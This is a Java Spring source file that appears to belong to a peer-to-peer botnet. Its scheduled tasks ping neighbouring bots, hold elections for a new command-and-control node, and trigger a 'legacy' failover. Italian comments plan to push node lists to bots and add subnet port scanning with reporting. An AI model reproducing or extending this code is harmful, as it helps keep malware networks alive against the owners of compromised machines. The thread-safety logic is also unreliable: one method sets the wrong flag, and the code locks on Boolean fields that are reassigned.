package cs.sii.schedule.net;

import java.security.PublicKey;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import cs.sii.bot.action.Behavior;
import cs.sii.config.onLoad.Config;
import cs.sii.control.command.Commando;
import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.service.connection.NetworkService;

@Component
public class ScheduledTasksNet {

	private static final Logger log = LoggerFactory.getLogger(ScheduledTasksNet.class);

	private static final SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
	@Autowired
	private Commando cmm;
	@Autowired
	private NetworkService nServ;
	@Autowired
	private Config configEngine;
	@Autowired
	private Behavior botB;

	private Boolean flagELection = false;
	private Boolean flagNeighbours = false;
	private Boolean flagLegacy = false;

	@Scheduled(initialDelay = 100000, fixedRate = 60000)
	public void pingNeighbours() {
		synchronized (flagLegacy) {
			if (flagLegacy == false)
				synchronized (flagELection) {
					if (flagELection == false) {
						synchronized (flagNeighbours) {
							flagNeighbours = true;
						}
						botB.pingToNeighbours();
						synchronized (flagNeighbours) {
							flagNeighbours = false;
						}

					}
				}
		}
	}

	@Scheduled(initialDelay = 140000, fixedRate = 120000)
	public void electionDay() {
		synchronized (flagLegacy) {
			if (flagLegacy == false)
				synchronized (flagNeighbours) {
					if (flagNeighbours == false)
						if (configEngine.isCommandandconquerStatus()) {
							synchronized (flagELection) {
								flagNeighbours = true;
							}
							cmm.startElection();
							synchronized (flagELection) {
								flagNeighbours = false;
							}
						}
				}
		}
	}

	@Scheduled(initialDelay = 180000, fixedRate = 60000)
	public void rollBack() {
		synchronized (flagELection) {
			synchronized (flagNeighbours) {
				if (flagELection == false) {
					if (flagNeighbours == false) {
						if (!configEngine.isCommandandconquerStatus()) {
							if (nServ.getCounterCeCMemory() == 1) {
								synchronized (flagLegacy) {
									flagLegacy = true;
								}
								cmm.legacy();
								if(getLegacy()){
									setLegacy(false);
								}
							}
						}
					}
				}
			}
		}

	}

	public Boolean setLegacy(Boolean newLegacy){
		synchronized (flagLegacy) {
			flagLegacy=newLegacy;
			return true;
		}
		
		
	}

	
	
	public Boolean getLegacy(){
		synchronized (flagLegacy) {
			return flagLegacy;
		}
		
		
	}

	@Scheduled(fixedRate = 500000)
	public void pingVicinato() {

		log.info("The time is now {}", dateFormat.format(new Date()));
	}

	// se sei il cec ricalcola il grafo sulla base del vecchio con Updatenetwork
	// ogni tot tempo e se la lista dei nodi è cambiata
	// poi spamma la list anuova

	// eleggere nuovo gruppo di cec e spammare ai bot il nuovo gruppo da cui
	// eseguire chiamate

	// Scan porte e sottorete + invio report?= sarebbe sgravo se fatto

}